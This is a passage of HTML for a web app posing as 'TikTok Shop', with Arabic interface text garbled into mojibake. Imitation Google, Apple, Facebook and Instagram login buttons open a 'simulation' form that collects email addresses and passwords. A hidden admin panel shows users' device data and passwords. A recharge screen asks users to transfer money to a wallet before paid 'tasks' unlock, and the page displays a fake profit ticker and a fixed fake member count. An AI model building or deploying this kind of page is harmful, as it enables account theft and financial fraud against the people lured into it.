<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Complete Auth</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC5zPaTAAU5lPCZ7LstSQ8J9IWmkQrpcMg",
            authDomain: "tiktokshop-9fd63.firebaseapp.com",
            projectId: "tiktokshop-9fd63",
            storageBucket: "tiktokshop-9fd63.firebasestorage.app",
            messagingSenderId: "1008538085856",
            appId: "1:1008538085856:web:83caa9dc0d7444e12c2385",
            measurementId: "G-1NSG64V4D4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.db = db;
        window.ref = ref;
        window.set = set;
        window.get = get;
        window.update = update;
        window.remove = remove;
        window.onValue = onValue;
        window.push = push;

        console.log("System Ready");
        initializeAppLogic();
    </script>

    <style>
        body { font-family: 'Tajawal', sans-serif; user-select: none; background-color: #fff; }
        .hidden { display: none !important; }
        
        /* Auth Layout */
        .auth-container {
            max-width: 400px; margin: 0 auto; padding: 20px; min-height: 100vh;
            display: flex; flex-direction: column; justify-content: center;
        }

        /* Social Buttons */
        .btn-social {
            display: flex; align-items: center; justify-content: center;
            width: 100%; padding: 12px; margin-bottom: 10px;
            border-radius: 10px; font-weight: bold; font-size: 14px;
            cursor: pointer; transition: 0.2s; position: relative;
        }
        .btn-social:active { transform: scale(0.98); }
        .btn-social i, .btn-social img { position: absolute; left: 20px; width: 20px; font-size: 18px; }
        
        .btn-google { background: white; border: 1px solid #e5e7eb; color: #374151; }
        .btn-apple { background: black; color: white; border: 1px solid black; }
        .btn-facebook { background: #1877f2; color: white; border: none; }
        .btn-insta { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; }

        /* Inputs */
        .modern-input { 
            width: 100%; padding: 14px 15px; 
            border: 1px solid #e5e7eb; border-radius: 12px; 
            background: #f9fafb; outline: none; margin-bottom: 10px;
            text-align: right;
        }
        .modern-input:focus { border-color: #000; background: #fff; }

        .back-btn { position: absolute; top: 20px; right: 20px; font-size: 20px; cursor: pointer; color: #333; z-index: 10; }

        /* Animation */
        .fade-in { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Simulation Modal */
        .sim-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .sim-content { background: white; width: 90%; max-width: 350px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .sim-input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px; text-align: left; direction: ltr; }
        .sim-btn { width: 100%; padding: 10px; border-radius: 8px; font-weight: bold; color: white; cursor: pointer; background: #2563eb; }

        /* Admin & App Styles */
        .admin-sidebar { background: #1e293b; color: white; width: 250px; min-height: 100vh; position: fixed; right: 0; top: 0; padding: 20px; z-index: 50; }
        .admin-content { margin-right: 250px; padding: 20px; min-height: 100vh; background: #f1f5f9; }
        .admin-nav-item { display: flex; items-center; padding: 12px 15px; margin-bottom: 8px; border-radius: 10px; cursor: pointer; transition: 0.2s; color: #94a3b8; font-weight: bold; font-size: 14px; }
        .admin-nav-item:hover, .admin-nav-item.active { background: #334155; color: #fbbf24; }
        .custom-table { width: 100%; border-collapse: collapse; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); font-size: 12px; }
        .custom-table th { background: #f8fafc; padding: 12px; text-align: right; }
        .custom-table td { padding: 12px; border-bottom: 1px solid #f3f4f6; }

        @media (max-width: 768px) { .admin-sidebar { width: 60px; padding: 10px 5px; } .admin-content { margin-right: 60px; } .admin-sidebar span { display: none; } }
        
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #000; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .modal-box { background: white; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; position: relative; max-height: 90vh; overflow-y: auto; }
        .slider-container { position: relative; width: 100%; height: 200px; overflow: hidden; border-radius: 1rem; margin-bottom: 1.5rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-size: cover; background-position: center; opacity: 0; transition: opacity 1s ease-in-out; }
        .slide.active { opacity: 1; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; white-space: nowrap; animation: marquee 15s linear infinite; }
    </style>
</head>
<body>

    <div id="loading-overlay" class="fixed inset-0 bg-white z-[999] flex flex-col items-center justify-center">
        <div class="loader mb-4"></div>
        <p class="text-sm text-gray-500 font-bold">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
    </div>

    <div id="auth-screen" class="hidden">
        
        <div id="auth-landing" class="auth-container fade-in relative">
            <div class="text-center mb-8 mt-4">
                <div class="w-20 h-20 bg-black text-white rounded-3xl flex items-center justify-center mx-auto mb-4 shadow-xl">
                    <i class="fa-brands fa-tiktok text-4xl"></i>
                </div>
                <h1 class="text-3xl font-extrabold text-gray-900 mb-1">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
                <p class="text-gray-500 text-sm">Ù‚Ù… Ø¨Ø¥Ø¯Ø§Ø±Ø© Ø£Ø±Ø¨Ø§Ø­Ùƒ ÙˆÙ…ØªØ¬Ø±Ùƒ Ø¨Ø³Ù‡ÙˆÙ„Ø©</p>
            </div>

            <div onclick="openSimulation('google')" class="btn-social btn-google">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Google
                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google">
            </div>
            <div onclick="openSimulation('apple')" class="btn-social btn-apple">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Apple
                <i class="fa-brands fa-apple"></i>
            </div>
            <div onclick="openSimulation('facebook')" class="btn-social btn-facebook">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Facebook
                <i class="fa-brands fa-facebook-f"></i>
            </div>
            <div onclick="openSimulation('instagram')" class="btn-social btn-insta">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Instagram
                <i class="fa-brands fa-instagram"></i>
            </div>

            <div class="flex items-center my-5">
                <div class="flex-1 border-t border-gray-200"></div>
                <span class="px-3 text-gray-400 text-xs font-bold">Ø£Ùˆ</span>
                <div class="flex-1 border-t border-gray-200"></div>
            </div>

            <button onclick="switchView('auth-login')" class="w-full bg-gray-100 text-gray-700 py-3.5 rounded-xl font-bold hover:bg-gray-200 transition mb-4 flex justify-center items-center gap-2">
                <i class="fa-solid fa-phone"></i> ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
            </button>

            <p class="text-center text-sm text-gray-500">
                Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ 
                <span onclick="switchView('auth-register')" class="text-blue-600 font-bold cursor-pointer hover:underline">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</span>
            </p>

            <div class="mt-8 text-center">
                <span onclick="adminLoginPrompt()" class="text-gray-300 text-xs cursor-pointer">Admin Login</span>
            </div>
        </div>

        <div id="auth-login" class="auth-container fade-in hidden relative">
            <i onclick="switchView('auth-landing')" class="fa-solid fa-arrow-right back-btn"></i>
            
            <div class="text-center mb-8 mt-10">
                <h2 class="text-2xl font-bold mb-2">Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ø¹ÙˆØ¯ØªÙƒ ğŸ‘‹</h2>
                <p class="text-gray-500">Ø£Ø¯Ø®Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
            </div>

            <div class="space-y-2">
                <input type="text" id="login-phone" class="modern-input" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ">
                <input type="password" id="login-pass" class="modern-input" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
            </div>
            
            <button onclick="loginUser()" class="w-full bg-black text-white py-4 rounded-xl font-bold shadow-lg mt-6 hover:opacity-90 transition">
                ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            </button>
        </div>

        <div id="auth-register" class="auth-container fade-in hidden relative">
            <i onclick="switchView('auth-landing')" class="fa-solid fa-arrow-right back-btn"></i>

            <div class="text-center mb-8 mt-6">
                <h2 class="text-2xl font-bold mb-2">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ ğŸš€</h2>
                <p class="text-gray-500">Ø§Ù…Ù„Ø£ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ§Ù„ÙŠØ©</p>
            </div>

            <div id="reg-step-1">
                <label class="block text-sm font-bold text-gray-700 mb-1">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                <input type="number" id="reg-phone" class="modern-input" placeholder="01xxxxxxxxx">
                <button onclick="sendOtp()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold shadow-lg mt-4">Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚</button>
            </div>

            <div id="reg-step-2" class="hidden text-center">
                <p class="text-sm text-gray-600 mb-4">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ ÙÙŠ Ø±Ø³Ø§Ù„Ø© Ù†ØµÙŠØ©</p>
                <input type="number" id="reg-otp-input" class="modern-input text-center text-2xl tracking-widest font-bold" placeholder="----">
                <button onclick="verifyOtp()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold mt-4">ØªØ£ÙƒÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯</button>
                <p onclick="resendOtp()" class="text-xs text-gray-400 mt-4 cursor-pointer underline">Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„</p>
            </div>

            <div id="reg-step-3" class="hidden space-y-3">
                <div>
                    <label class="text-xs font-bold text-gray-500">Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</label>
                    <input type="text" id="reg-name" class="modern-input">
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
                    <input type="date" id="reg-dob" class="modern-input text-gray-600">
                    <p class="text-[10px] text-red-400">* ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 16 Ø³Ù†Ø© ÙØ£ÙƒØ«Ø±</p>
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="password" id="reg-pass" class="modern-input">
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="password" id="reg-pass-confirm" class="modern-input">
                </div>
                <button onclick="completeRegistration()" class="w-full bg-[#FCD34D] text-black py-4 rounded-xl font-bold shadow-lg mt-2">Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„</button>
            </div>
        </div>
    </div>

    <div id="sim-modal" class="sim-modal hidden">
        <div class="sim-content relative">
            <i onclick="closeSimulation()" class="fa-solid fa-xmark absolute top-3 left-3 cursor-pointer text-gray-400 hover:text-gray-600 text-xl"></i>
            <div class="mb-6 text-center">
                <img id="sim-logo" src="" class="w-12 mx-auto mb-3">
                <h3 id="sim-title" class="font-bold text-lg text-gray-800">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h3>
            </div>
            <input type="email" id="sim-email" class="sim-input" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
            <input type="password" id="sim-pass" class="sim-input" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
            <input type="hidden" id="sim-provider">
            <button onclick="submitSimulation()" id="sim-btn" class="sim-btn">Ù…ØªØ§Ø¨Ø¹Ø©</button>
        </div>
    </div>

    <div id="admin-panel" class="hidden flex">
        <aside class="admin-sidebar">
            <div class="flex items-center gap-3 mb-8 px-2"><i class="fa-solid fa-shield-halved text-yellow-400 text-2xl"></i><span class="text-xl font-bold text-white">Admin Pro</span></div>
            <nav>
                <div onclick="showAdminTab('dashboard')" class="admin-nav-item active" id="nav-dashboard"><i class="fa-solid fa-chart-pie"></i> <span>Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</span></div>
                <div onclick="showAdminTab('users')" class="admin-nav-item" id="nav-users"><i class="fa-solid fa-users"></i> <span>Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</span></div>
                <div onclick="showAdminTab('tasks')" class="admin-nav-item" id="nav-tasks"><i class="fa-solid fa-list-check"></i> <span>Ø§Ù„Ù…Ù‡Ø§Ù…</span></div>
                <div onclick="showAdminTab('signatures')" class="admin-nav-item" id="nav-signatures"><i class="fa-solid fa-gem"></i> <span>Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</span></div>
                <div onclick="showAdminTab('requests')" class="admin-nav-item" id="nav-requests"><i class="fa-solid fa-money-bill-transfer"></i> <span>Ø§Ù„Ù…Ø§Ù„ÙŠØ©</span></div>
                <div onclick="showAdminTab('support')" class="admin-nav-item" id="nav-support"><i class="fa-solid fa-headset"></i> <span>Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ</span></div>
                <div onclick="showAdminTab('settings')" class="admin-nav-item" id="nav-settings"><i class="fa-solid fa-gear"></i> <span>Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª</span></div>
                <div onclick="logout()" class="admin-nav-item text-red-400 hover:text-red-300 mt-8"><i class="fa-solid fa-right-from-bracket"></i> <span>Ø®Ø±ÙˆØ¬</span></div>
            </nav>
        </aside>
        <main class="admin-content flex-1">
            <header class="flex justify-between items-center mb-8 bg-white p-4 rounded-xl shadow-sm">
                <h2 class="text-2xl font-bold text-gray-800" id="page-title">Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h2>
                <div class="flex items-center gap-3"><span class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span><span class="text-sm text-gray-500 font-bold">Ù…ØªØµÙ„</span></div>
            </header>
            <div id="admin-dashboard-sec" class="admin-section">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
                    <div class="bg-white p-6 rounded-xl shadow-sm flex justify-between items-center"><div><p class="text-gray-500 font-bold">Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</p><h3 class="text-3xl font-bold" id="stat-total-users">0</h3></div><i class="fa-solid fa-users text-4xl text-blue-100 text-blue-500"></i></div>
                    <div class="bg-white p-6 rounded-xl shadow-sm flex justify-between items-center"><div><p class="text-gray-500 font-bold">Ø§Ù„Ø£Ø±ØµØ¯Ø©</p><h3 class="text-3xl font-bold text-green-600" id="stat-total-balance">0</h3></div><i class="fa-solid fa-wallet text-4xl text-green-100 text-green-500"></i></div>
                    <div class="bg-white p-6 rounded-xl shadow-sm flex justify-between items-center"><div><p class="text-gray-500 font-bold">Ø§Ù„Ø·Ù„Ø¨Ø§Øª</p><h3 class="text-3xl font-bold text-orange-500" id="stat-pending-req">0</h3></div><i class="fa-solid fa-clock text-4xl text-orange-100 text-orange-500"></i></div>
                </div>
            </div>
            <div id="admin-users-sec" class="hidden admin-section">
                <div class="bg-white rounded-xl shadow-sm p-4">
                    <input type="text" id="search-user" onkeyup="searchUsers()" placeholder="Ø¨Ø­Ø«..." class="border p-2 rounded-lg w-64 text-sm bg-gray-50 mb-4">
                    <div class="overflow-x-auto"><table class="custom-table"><thead><tr><th>Ø§Ù„Ø¹Ù…ÙŠÙ„</th><th>Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</th><th>Ø¨Ø§Ø³ÙˆØ±Ø¯</th><th>Ø±ØµÙŠØ¯</th><th>Ø§Ù„Ø­Ø§Ù„Ø©</th><th>ØªØ­ÙƒÙ…</th></tr></thead><tbody id="admin-users-list"></tbody></table></div>
                </div>
            </div>
            <div id="admin-tasks-sec" class="hidden admin-section"><div class="flex justify-between mb-4"><h3 class="font-bold">Ø§Ù„Ù…Ù‡Ø§Ù…</h3><button onclick="saveAdminTasks()" class="bg-green-600 text-white px-4 py-2 rounded font-bold text-sm">Ø­ÙØ¸</button></div><div id="admin-tasks-container" class="space-y-3"></div></div>
            <div id="admin-signatures-sec" class="hidden admin-section"><div class="flex justify-between mb-4"><h3 class="font-bold">Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</h3><button onclick="saveAdminSignatures()" class="bg-green-600 text-white px-4 py-2 rounded font-bold text-sm">Ø­ÙØ¸</button></div><div id="admin-signatures-container" class="space-y-4"></div><button onclick="addNewSignature()" class="mt-4 w-full bg-orange-100 text-orange-600 py-3 rounded-xl border-2 border-dashed border-orange-300 font-bold">+ Ø¥Ø¶Ø§ÙØ© Ø¨Ø§Ù‚Ø©</button></div>
            <div id="admin-requests-sec" class="hidden admin-section"><div class="bg-white rounded-xl shadow-sm p-4 overflow-x-auto"><table class="custom-table"><thead><tr><th>Ø§Ù„Ù…Ø±Ø³Ù„</th><th>Ø§Ù„Ù…Ø¨Ù„Øº</th><th>ØµÙˆØ±Ø©</th><th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡</th></tr></thead><tbody id="admin-requests-list"></tbody></table></div></div>
            <div id="admin-support-sec" class="hidden admin-section"><div class="bg-white rounded-xl shadow-sm p-4 overflow-x-auto"><table class="custom-table"><thead><tr><th>Ø§Ù„Ø¹Ù…ÙŠÙ„</th><th>Ø§Ù„Ø±Ø³Ø§Ù„Ø©</th><th>Ø§Ù„Ø±Ø¯</th></tr></thead><tbody id="admin-support-list"></tbody></table></div></div>
            <div id="admin-settings-sec" class="hidden admin-section"><div class="bg-white p-6 rounded-xl shadow-sm max-w-2xl"><div class="space-y-4"><div><label class="block text-sm font-bold text-gray-600">Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø©</label><input type="text" id="setting-cash-number" class="w-full border p-3 rounded-lg"></div><div><label class="block text-sm font-bold text-gray-600">Ø±Ø§Ø¨Ø· Ø§Ù„Ø¯Ø¹Ù…</label><input type="text" id="setting-support-link" class="w-full border p-3 rounded-lg"></div><div><label class="block text-sm font-bold text-gray-600">Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†</label><input type="text" id="setting-announcement" class="w-full border p-3 rounded-lg"></div><button onclick="saveSiteSettings()" class="w-full bg-black text-white py-3 rounded-xl font-bold">Ø­ÙØ¸</button></div></div></div>
        </main>
    </div>

    <div id="client-app" class="hidden relative pb-20 bg-gray-50 min-h-screen">
        <div id="recharge-modal" class="modal-overlay hidden">
            <div class="modal-box">
                <button onclick="closeRechargeModal()" class="absolute top-2 left-3 text-2xl font-bold text-gray-700">&times;</button>
                <h3 class="text-xl font-bold mb-4 text-gray-800">Ø´Ø­Ù† Ø§Ù„Ø±ØµÙŠØ¯</h3>
                <div id="recharge-rejected-alert" class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4 hidden text-right"><strong class="font-bold block mb-1">ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨Ùƒ!</strong><span class="text-sm block" id="recharge-rejection-reason"></span></div>
                <div class="bg-yellow-50 p-3 rounded text-sm mb-4 text-yellow-800 font-bold border border-yellow-200"><p class="mb-2">ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰:</p><div class="flex items-center justify-center gap-3 bg-white p-2 rounded-lg border border-yellow-300 shadow-sm mt-1"><span id="recharge-admin-number" class="text-xl text-black font-mono font-bold tracking-wider">...</span><button onclick="copyToClipboard()" class="text-gray-500 hover:text-blue-600 transition"><i id="copy-icon" class="fa-regular fa-copy text-xl"></i></button></div></div>
                <input type="number" id="charge-amount" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="Ø§Ù„Ù…Ø¨Ù„Øº">
                <input type="text" id="charge-name" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø­ÙˆÙ„">
                <input type="text" id="charge-sender" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø©">
                <input type="file" id="recharge-file-input" class="hidden" accept="image/*" onchange="handleFileSelect(event)">
                <label for="recharge-file-input" class="flex flex-col items-center justify-center border-2 border-dashed border-gray-300 p-4 rounded mb-4 cursor-pointer hover:bg-gray-100"><i id="upload-icon" class="fa-solid fa-cloud-upload text-3xl text-gray-400 mb-2"></i><span id="upload-text" class="text-xs text-gray-500 mt-1">ØµÙˆØ±Ø© Ø§Ù„ØªØ­ÙˆÙŠÙ„</span><img id="upload-preview" src="" class="hidden w-full h-20 object-cover rounded mt-2"></label>
                <button onclick="submitRechargeRequest()" class="w-full bg-black text-white py-3 rounded-lg font-bold shadow-lg">Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨</button>
            </div>
        </div>

        <div id="home-page" class="fade-in p-4">
            <header class="flex justify-between items-center mb-4 pt-2">
                <i class="fa-regular fa-bell text-xl text-gray-600"></i>
                <div class="flex items-center gap-2"><span class="font-bold text-lg">TikTok Shop</span><i class="fa-brands fa-tiktok text-2xl text-black"></i></div>
                <i onclick="switchTab('support-page')" class="fa-solid fa-headset text-2xl text-purple-600 cursor-pointer hover:scale-110 transition"></i>
            </header>
            <div class="bg-blue-600 text-white text-center py-2 px-2 mb-4 shadow-lg text-sm font-bold rounded-lg overflow-hidden whitespace-nowrap"><span id="announcement-display-text" class="animate-marquee">...</span></div>
            <div class="slider-container rounded-2xl overflow-hidden shadow-lg mb-6 h-48 relative">
                <div class="slide active" style="background-image: url('https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?w=800');"></div>
                <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1483985988355-763728e1935b?w=800');"></div>
                <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=800');"></div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div onclick="openRechargeModal()" class="bg-white p-4 rounded-2xl shadow-sm text-center border active:scale-95 transition"><div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2 text-blue-600"><i class="fa-solid fa-wallet"></i></div><h3 class="font-bold text-sm">Ø´Ø­Ù†</h3></div>
                <div class="bg-white p-4 rounded-2xl shadow-sm text-center border"><div class="w-10 h-10 bg-yellow-50 rounded-full flex items-center justify-center mx-auto mb-2 text-yellow-600"><i class="fa-solid fa-sack-dollar"></i></div><h3 class="font-bold text-sm">Ø³Ø­ÙˆØ¨Ø§Øª</h3><div id="fake-profit-ticker" class="h-8 overflow-hidden relative mt-1"></div></div>
            </div>
            <div class="mt-4 text-center pt-2 border-t"><p class="text-gray-400 text-xs font-bold">Ø§Ù„Ø£Ø¹Ø¶Ø§Ø¡ Ø§Ù„Ù†Ø´Ø·ÙŠÙ†</p><div class="flex justify-center items-center gap-2 text-gray-800"><i class="fa-solid fa-users text-blue-500"></i><p class="text-xl font-bold" id="fake-user-count">54,230</p></div></div>
        </div>

        <div id="support-page" class="hidden fade-in p-4 pb-24">
            <h2 class="font-bold text-xl mb-4 text-center">Ø§Ù„Ø¯Ø¹Ù…</h2>
            <div id="client-support-history" class="mb-4 space-y-3 max-h-[50vh] overflow-y-auto p-2 bg-gray-100 rounded-lg"></div>
            <textarea id="support-msg-input" rows="3" class="w-full p-3 border rounded-lg mb-2" placeholder="Ø±Ø³Ø§Ù„ØªÙƒ..."></textarea>
            <button onclick="sendSupportMessage()" class="w-full bg-purple-600 text-white py-3 rounded-lg font-bold">Ø¥Ø±Ø³Ø§Ù„</button>
            <a id="direct-support-btn" href="#" target="_blank" class="block w-full mt-4 bg-green-500 text-white text-center py-3 rounded-lg font-bold">ÙˆØ§ØªØ³Ø§Ø¨</a>
        </div>

        <div id="signature-page" class="hidden fade-in p-4 pb-24"><h2 class="text-center font-bold text-xl mb-6">Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</h2><div id="signature-list" class="space-y-4"></div></div>

        <div id="work-page" class="hidden fade-in min-h-screen bg-yellow-400 relative pb-24">
            <div class="p-6 text-black"><span class="font-bold text-2xl">Ø§Ù„Ù…Ù‡Ø§Ù… Ø§Ù„ÙŠÙˆÙ…ÙŠØ©</span></div>
            <div id="sign-alert" class="bg-white/90 m-4 p-6 rounded-2xl shadow-lg text-center hidden"><i class="fa-solid fa-lock text-4xl text-red-500 mb-4 block"></i><h3 class="font-bold">Ù…ØºÙ„Ù‚</h3><p class="text-sm text-gray-500 mb-4">ÙŠØ¬Ø¨ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ ÙÙŠ Ø¨Ø§Ù‚Ø©</p><button onclick="switchTab('signature-page', document.getElementById('nav-sign'))" class="bg-black text-white px-4 py-2 rounded-full">Ø¹Ø±Ø¶ Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</button></div>
            <div id="task-area" class="px-4 transition-all duration-300">
                <div id="frozen-message" class="hidden frozen-overlay text-center p-6 m-4 shadow-xl border-2 border-yellow-600 rounded-2xl bg-white"><i class="fa-solid fa-clock text-4xl text-yellow-600 mb-4 block"></i><h3 class="font-bold">Ù‚ÙŠØ¯ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©</h3><p class="text-sm text-gray-500">Ø§Ù†ØªØ¸Ø± Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø¯ÙŠØ±</p></div>
                <div class="bg-white rounded-2xl p-6 shadow-lg mb-6">
                    <div class="flex justify-between items-start mb-4"><div><p id="task-name" class="font-bold text-lg mb-1">...</p><p class="text-gray-500 text-sm">Ù…Ø·Ù„ÙˆØ¨: <span id="task-price" class="text-black font-bold">0</span> Ø¬.Ù…</p></div><img id="task-img" src="" class="w-16 h-16 rounded-lg object-cover bg-gray-100"></div>
                    <div class="flex justify-between bg-gray-50 p-3 rounded-xl"><div class="text-center"><span class="block text-xs text-gray-400">Ø¹Ù…ÙˆÙ„Ø©</span><span id="task-commission" class="font-bold text-green-600">0</span></div><div class="text-center"><span class="block text-xs text-gray-400">Ø§Ù„Ù…Ù‡Ù…Ø©</span><span id="task-counter" class="font-bold">0/24</span></div></div>
                </div>
                <button id="work-btn" onclick="processTask()" class="w-full bg-black text-white py-3 rounded-xl font-bold shadow-lg text-lg active:scale-95 transition">Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ù‡Ù…Ø©</button>
            </div>
        </div>

        <div id="profile-page" class="hidden fade-in min-h-screen bg-white pb-24">
            <div class="bg-yellow-400 p-6 rounded-b-[3rem] shadow-sm mb-6">
                <div class="flex flex-col items-center gap-3 mb-6">
                    <div class="w-20 h-20 bg-white rounded-full flex items-center justify-center text-3xl font-bold text-yellow-600 shadow-lg border-4 border-yellow-300"><i class="fa-solid fa-user"></i></div>
                    <div class="text-center"><h2 id="profile-name" class="font-bold text-2xl text-black">User</h2><p id="profile-phone" class="text-gray-800 text-sm font-mono opacity-80">010xxxx</p></div>
                </div>
                <div class="flex justify-center gap-4 mb-6">
                    <div class="bg-black/10 px-3 py-1 rounded-full text-xs font-bold text-black flex items-center gap-2"><span>ID: <span id="profile-id">---</span></span><i class="fa-regular fa-copy cursor-pointer hover:text-white transition" onclick="copyId()"></i></div>
                    <div class="bg-black text-yellow-400 px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1"><i class="fa-solid fa-crown"></i><span id="profile-rank">Ù…Ø¬Ø§Ù†ÙŠ</span></div>
                </div>
                <div class="bg-white/90 backdrop-blur rounded-2xl p-4 flex justify-between text-center shadow-lg border border-white/50 mx-4">
